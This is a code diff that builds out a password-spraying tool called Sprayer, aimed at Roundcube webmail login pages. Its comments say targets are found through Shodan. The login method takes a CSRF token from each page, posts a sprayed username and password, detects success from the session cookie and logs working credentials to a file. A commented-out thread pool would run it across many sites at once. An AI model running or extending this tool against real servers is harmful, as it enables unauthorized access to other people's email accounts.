@@ -50,7 +50,73 @@ class Sprayer(object):
         self.urls = normalized_urls
 
     def login(self, url):
-        maybe
+        try:
+            url = f"{url}"
+            req = requests.get(
+                url=url,
+                headers=self.headers,
+                timeout=30,
+                verify=False
+            )
+            # because different languages won't have the same "The installer is disabled!" message.
+        except Exception as err:
+            # failed to request, exit.
+            print(err)
+            self.pbar.update()
+            return
+        
+        # now get the redirect path
+        # this is important because some sites may have it as /mail or /roundemail or /login
+        
+        # parse the request_token needed for login
+        try:
+            open("test.html", 'wb').write(req.content)
+            '''
+            
+            we could do a apache default homepage check and if so then try /roundcubemail,
+            but we're getting our urls from shodan with the http.title:"Roundcube..." so 
+            it should already have a proper redirect to it.
+            
+            '''
+            request_token = req.text.split('"request_token":"', 1)[1].split('"', 1)[0].strip().rstrip()
+            
+            headers = self.headers
+            headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            url = f"{url}/?_task=login"
+
+            data = {
+                "_token": request_token,
+                "_task": "login",
+                "_action": "login",
+                "_timezone": "America/New_York",
+                "_url=_task": "login",
+                "_user": self.username,
+                "_pass": self.password,
+            }
+
+            # try logging in now
+            req = requests.post(
+                url=url,
+                headers=headers,
+                data=data,
+                verify=False
+            )
+            # by status code we can see if it failed or succeeded & by the returned cookie name
+            if req.status_code != 401 and 'roundcube_sessauth' in f"{req.cookies}":
+                print(f"{Fore.GREEN}[ {self.username}:{self.password}({url}) ]")
+                self.lock.acquire()
+                self.results_file(f"[ {self.username}:{self.password}({url}) ]\n")
+                self.results_file.flush()
+                self.lock.release()
+                self.pbar.update()
+                return
+            # login failed
+            print(f"{Fore.RED}[ Login Failed ! ]")
+            self.pbar.update()
+        except Exception as err:
+            print(f"{err}")
+            # some sort of exception was thrown
+            self.pbar.update()
 
     def main(self):
         self.normalize_urls()
@@ -59,9 +125,10 @@ class Sprayer(object):
         self.username = input(f"[ Username to spray ]: ").strip().rstrip()
         self.password = input(f"[ Password to spray ]: ").strip().rstrip()
 
-        self.login(f"http://198.18.2.187")
+        self.login(f"http://198.18.2.187/roundcubemail")
         # with ThreadPoolExecutor(max_workers=100) as executor:
         #     executor.map( self.login, self.urls )
+        self.results_file.close()
 
 
 if __name__ == "__main__":
